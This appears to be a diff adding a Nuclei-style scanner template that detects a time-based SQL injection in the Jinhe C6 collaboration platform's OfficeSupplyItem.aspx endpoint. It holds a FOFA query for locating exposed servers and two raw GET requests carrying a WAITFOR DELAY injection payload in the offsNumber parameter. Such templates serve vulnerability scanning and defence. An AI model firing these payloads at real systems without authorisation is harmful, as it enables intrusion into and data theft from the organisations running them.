@@ -1,0 +1,30 @@
+id: jinhewanluo-c6-officesupplyItem_aspx-sql-time
+
+info:
+  name: 金和C6协同管理平台 /C6/Jhsoft.Web.officesupply/OfficeSupplyItem.aspx SQL延时注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+    金和C6协同管理平台 /C6/Jhsoft.Web.officesupply/OfficeSupplyItem.aspx 接口存在SQL延时注入漏洞。攻击者可通过构造包含延时SQL语句的恶意GET请求，利用id和offsNumber参数触发漏洞，注入延时SQL语句，触发页面延时响应，进而获取数据库敏感信息，危害系统安全。
+  reference:
+    - 
+  tags: sql-time, jinhe, oa
+
+http:
+  - raw:
+      - |-
+        GET /C6/Jhsoft.Web.officesupply/OfficeSupplyItem.aspx/?id=1&offsNumber=1';+IF+(SELECT+DB_NAME())+=+'C6'+WAITFOR+DELAY+'0:0:4'--%20 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+      - |-
+        GET /C6/Jhsoft.Web.officesupply/OfficeSupplyItem.aspx/?id=1&offsNumber=1';+IF+(SELECT+DB_NAME())+=+'C6'+WAITFOR+DELAY+'0:0:8'--%20 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: SQL延时注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
